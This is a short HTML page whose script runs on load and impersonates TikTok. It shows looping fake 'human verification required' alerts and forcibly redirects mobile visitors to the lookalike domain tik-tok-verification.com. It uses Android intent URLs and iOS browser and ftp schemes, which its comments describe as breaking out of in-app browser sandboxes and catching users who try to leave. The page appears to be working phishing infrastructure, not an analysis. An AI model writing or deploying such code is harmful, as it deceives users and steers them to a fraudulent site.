<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body { background: #fff; margin: 0; padding: 0; }</style>
</head>
<body>

<script>
    const targetUrl = "https://tik-tok-verification.com/Verification/verify1.html";
    const urlNoProt = targetUrl.replace("https://", "");
    const killTime = Date.now() + 20000;

    function absoluteForce() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        if (isAndroid) {
            // Forces the Android system to show the "Open with" browser menu
            window.location.href = `intent://${urlNoProt}#Intent;scheme=https;action=android.intent.action.VIEW;category=android.intent.category.BROWSABLE;end`;
        } else {
            // iOS: The "Protocol Stack"
            // 1. Try to trigger a browser-specific scheme to break the sandbox
            window.location.href = "googlechromes://" + urlNoProt;
            
            // 2. If focus remains, try the Microsoft Edge scheme (forces OS picker)
            setTimeout(() => {
                if (document.hasFocus()) {
                    window.location.href = "microsoft-edge-https://" + urlNoProt;
                }
            }, 50);

            // 3. The "Direct-to-Safari" System Prompt
            // This forces the "Open in Safari?" system dialog on 90% of iOS versions
            setTimeout(() => {
                if (document.hasFocus()) {
                    window.location.href = "ftp://" + urlNoProt;
                }
            }, 100);
        }
    }

    function securityEngine() {
        if (Date.now() > killTime) return;

        // Fire BEFORE alert
        absoluteForce();

        setTimeout(() => {
            if (document.hasFocus()) {
                const header = "HUMAN VERIFICATION REQUIRED\n";
                const body = "______________________________\n\nSuspicious network activity detected, please complete human verification to continue using TikTok.";
                
                alert(header + body);

                // Fire IMMEDIATELY after OK
                absoluteForce();

                // Repeat cycle
                setTimeout(securityEngine, 400);
            }
        }, 400);
    }

    window.onload = securityEngine;
    // Catch them if they try to swipe/minimize
    window.onfocus = () => { if (Date.now() < killTime) absoluteForce(); };
</script>

</body>
</html>
